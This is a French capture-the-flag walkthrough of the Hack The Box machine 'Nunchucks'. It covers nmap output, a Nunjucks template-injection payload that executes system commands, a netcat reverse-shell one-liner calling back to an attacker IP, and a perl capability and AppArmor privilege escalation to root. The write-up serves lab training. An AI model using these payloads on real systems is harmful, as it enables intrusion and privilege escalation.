# Nunchucks - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-16 21:20 EDT
Nmap scan report for 10.10.11.122
Host is up (0.023s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.98 seconds
```

On rajoute à notre /etc/hosts pour accéder à [https://nunchucks.htb/](https://nunchucks.htb/). On lance un gobuster en tâche de fond. Avec vhost on trouve le sous domaine store

Il y a une page de signup donc on tente sqlmap.

Le champ d’adresse mail est dynamique sur le site du store, c’est le seul élément du site, on essaye des templates. C’est du node.js.

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jade-nodejs](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jade-nodejs)

Il y a un template pour nunjucks, ce qui nous fait fortement penser au nom de la box donc on test:

```bash
{{7*7}}
```

ça donne bien 49

On essaye donc:

```bash
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```

On utilise burp pour lancer la requête et on obtient bien le /etc/passwd. On peut obtenir le flag user en tant que david.

On essaye direct de lancer un reverse shell. Une commande directe ne fonctionne pas donc on essaye d’autre payloads classique et celui-ci fonctionne:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.6 9090 >/tmp/f
```

On upload linpeas.sh, on remarque direct ça dans l’output:

```bash
/usr/bin/perl = cap_setuid+ep
```

[https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Cela ne fonctionne mais alors que on peut avoir id par exemple. On check dans l’apparmor et on voit ce passage pour perl:

```bash
/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```

Ce fichier définit les accès. Grâce à ce bug s’il on écrit la commande dans un fichier ça fonctionne et on obtient un shell root ! 

[https://bugs.launchpad.net/apparmor/+bug/1911431](https://bugs.launchpad.net/apparmor/+bug/1911431)